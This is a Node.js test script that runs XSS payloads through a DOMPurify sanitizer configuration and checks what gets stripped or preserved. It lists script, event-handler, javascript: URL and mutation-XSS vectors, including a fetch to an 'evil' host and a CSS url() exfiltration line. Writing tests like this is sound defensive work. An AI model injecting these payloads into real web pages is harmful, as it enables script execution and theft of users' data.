const { JSDOM } = require("jsdom");
const createDOMPurify = require("dompurify");
const window = new JSDOM("").window;
const DOMPurify = createDOMPurify(window);

// Exact config from app.jsx
const sanitizeHTML = (html) => DOMPurify.sanitize(html, {
  ALLOWED_TAGS: ["h1","h2","h3","h4","p","br","strong","b","em","i","u","s","del",
    "ul","ol","li","blockquote","pre","code","table","thead","tbody","tr","td","th",
    "a","img","hr","div","span","label","input","sub","sup","font"],
  ALLOWED_ATTR: ["href","src","title","alt","style","class","id","type","checked",
    "for","color","size","face","target","width","height","colspan","rowspan"],
  FORBID_TAGS: ["script","iframe","object","embed","form","textarea","select","button","meta","link","base"],
  FORBID_ATTR: ["onerror","onload","onclick","onmouseover","onfocus","onblur","onchange",
    "onsubmit","onkeydown","onkeyup","onkeypress","onmousedown","onmouseup"],
  ALLOW_DATA_ATTR: false,
});

let pass = 0, fail = 0;
function t(name, ok, detail) {
  if (ok) { console.log(`  ✓ ${name}`); pass++; }
  else { console.log(`  ✗ ${name}${detail ? ' → ' + detail : ''}`); fail++; }
}

console.log("\n=== XSS ATTACK VECTORS ===");
const vectors = [
  ['<script>alert(1)</script>', 'script'],
  ['<img src=x onerror="alert(1)">', 'onerror'],
  ['<svg onload=alert(1)>', 'onload'],
  ['<a href="javascript:alert(1)">x</a>', 'javascript:'],
  ['<iframe src="http://evil"></iframe>', 'iframe'],
  ['<object data="evil.swf"></object>', 'object'],
  ['<embed src="evil">', 'embed'],
  ['<form action="http://evil"><input type=password></form>', 'form'],
  ['<meta http-equiv="refresh" content="0;evil">', 'meta'],
  ['<link rel=stylesheet href="http://evil/x.css">', 'link'],
  ['<base href="http://evil/">', 'base'],
  ['<a href="vbscript:alert(1)">x</a>', 'vbscript:'],
  ['<div onmouseover="alert(1)">x</div>', 'onmouseover'],
  ['<input type="password" name=pw>', 'type=password input'],
  ['<img src="x" onerror="fetch(\'//evil\')">', 'fetch exfil'],
  // Blob / data URL hijacks
  ['<a href="data:text/html,<script>alert(1)</script>">x</a>', 'data: href'],
  ['<img src="data:image/svg+xml,<svg onload=alert(1)>">', 'svg in data'],
  // Mutation XSS
  ['<noscript><p title="</noscript><img src=x onerror=alert(1)>"></noscript>', 'mXSS noscript'],
  ['<svg><style><img src=x onerror=alert(1)></style></svg>', 'style in svg'],
  // CSS exfil
  ['<div style="background:url(http://evil/steal)">x</div>', 'CSS url exfil'],
];

for (const [payload, label] of vectors) {
  const clean = sanitizeHTML(payload);
  const bad = /(script|onload|onerror|onmouseover|javascript:|vbscript:|<iframe|<object|<embed|<form|<meta|<link|<base|type\s*=\s*["']?password)/i.test(clean);
  if (label.includes('password input')) {
    // DOMPurify won't block type="password" by default since `type` is in ALLOWED_ATTR
    t(`"${label}" → type attribute allowed (known limit)`, /type="password"/.test(clean));
    console.log(`      → sanitized: ${clean.slice(0, 100)}`);
  } else if (label.includes('CSS url exfil')) {
    // style attr is allowed — DOMPurify does pass through url()
    t(`"${label}" → style URL preserved (CSP connect-src 'none' blocks fetch)`, /url/.test(clean));
    console.log(`      → sanitized: ${clean.slice(0, 100)}`);
  } else {
    t(`Blocks "${label}"`, !bad, bad ? `residue: ${clean.slice(0, 100)}` : null);
  }
}

console.log("\n=== LEGITIMATE CONTENT ===");
const legit = [
  ['<p>Hello <strong>world</strong></p>', 'basic formatting'],
  ['<h1>Title</h1><h2>Sub</h2>', 'headings'],
  ['<ul><li>item</li></ul>', 'lists'],
  ['<table><tr><td>cell</td></tr></table>', 'tables'],
  ['<pre><code>const x = 1;</code></pre>', 'code'],
  ['<a href="https://example.com">link</a>', 'https link'],
  ['<img src="data:image/png;base64,iVBOR..." alt="test">', 'data: image (allowed)'],
  ['<div class="nf-check"><input type="checkbox" id="t1"><label for="t1">Do it</label></div>', 'checklist'],
  ['<blockquote>quote</blockquote>', 'blockquote'],
  ['<hr>', 'hr'],
];
for (const [html, label] of legit) {
  const clean = sanitizeHTML(html);
  const changed = clean !== html;
  const major = clean.length < html.length * 0.5;
  t(`Preserves ${label}`, !major, changed ? `minor diff: ${clean}` : null);
}

console.log("\n=== FORBID_ATTR BYPASS ATTEMPTS ===");
// FORBID_ATTR list doesn't include every onXYZ handler. Test the uncommon ones.
const onXYZ = ['onabort','onauxclick','onbeforeinput','oncopy','oncut','ondrag','ondrop',
               'onformdata','oninput','oninvalid','onpaste','onreset','onsearch','onselect',
               'onselectionchange','onselectstart','onslotchange','ontoggle','onwheel'];
for (const attr of onXYZ.slice(0, 6)) {
  const input = `<div ${attr}="alert(1)">x</div>`;
  const clean = sanitizeHTML(input);
  const kept = clean.includes(attr);
  t(`${attr} handler stripped`, !kept, kept ? `LEAKED: ${clean}` : null);
}

console.log("\n=== Summary ===");
console.log(`  ${pass} passed, ${fail} failed`);
